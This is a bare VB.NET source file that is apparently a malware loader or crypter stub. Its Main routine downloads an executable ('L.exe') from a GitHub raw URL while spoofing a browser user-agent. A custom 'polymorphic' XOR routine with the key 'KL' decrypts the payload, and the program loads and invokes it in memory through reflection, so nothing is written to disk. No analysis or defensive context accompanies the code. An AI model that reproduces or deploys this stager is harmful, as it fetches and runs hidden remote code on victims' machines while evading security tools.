Imports System
Imports System.Net
Imports System.Text
Imports Microsoft.VisualBasic.CompilerServices

Module xxxx
    Sub Main()
        Dim wc = New WebClient()
        wc.Headers.Add("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117 Safari/537.36")
        Dim b As Byte() = wc.DownloadData("https://github.com/crisco321/log/raw/main/L.exe")
        LateBinding.LateCall(Interaction.CallByName(Interaction.CallByName(AppDomain.CurrentDomain, "Load", CallType.[Get], Decrypted_PolyMorphic(b, "KL")), "EntryPoint", CallType.[Get], Nothing), Nothing, "Invoke", New Object() {"", Nothing}, Nothing, Nothing)
    End Sub

    Function Decrypted_PolyMorphic(ByVal File_1 As Byte(), ByVal PP As String) As Byte()
        Dim H As PolyMorphicDecrypt = New PolyMorphicDecrypt()
        Return PolyMorphicDecrypt.PolyDecrypt(File_1, Encoding.[Default].GetBytes(PP))
    End Function

    Public Class PolyMorphicDecrypt
        Public Shared Function PolyDecrypt(ByVal Data_1 As Byte(), ByVal KeyGen As Byte(), ByVal Optional Round As UInteger = 0) As Byte()
            For i As Int64 = 0 To (Data_1.Length - 1) * (Round + 1)
                Data_1(i Mod Data_1.Length) = Convert.ToByte((Convert.ToInt32(Data_1(i Mod Data_1.Length) Xor KeyGen(i Mod KeyGen.Length)) - Convert.ToInt32(Data_1((i + 1) Mod Data_1.Length)) + 256) Mod 256)
            Next

            Array.Resize(Data_1, Data_1.Length - 1)
            Return Data_1
        End Function
    End Class
End Module